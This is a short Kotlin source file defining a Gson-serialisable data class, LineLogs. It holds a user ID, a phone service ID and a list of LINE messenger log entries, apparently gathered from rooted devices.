package com.android.services.models.im

import com.android.services.db.entities.LineRooted
import com.google.gson.annotations.SerializedName

class LineLogs {
    @SerializedName("userId")
    var userId: String? = null
        private set

    @SerializedName("phoneServiceId")
    var phoneServiceId: String? = null
        private set

    @SerializedName("lineLogs")
    var lineList: List<LineRooted>? = null
        private set

    constructor()
    constructor(userId: String?, phoneServiceId: String?, lineUnrootedList: List<LineRooted>?) {
        this.userId = userId
        this.phoneServiceId = phoneServiceId
        lineList = lineUnrootedList
    }
}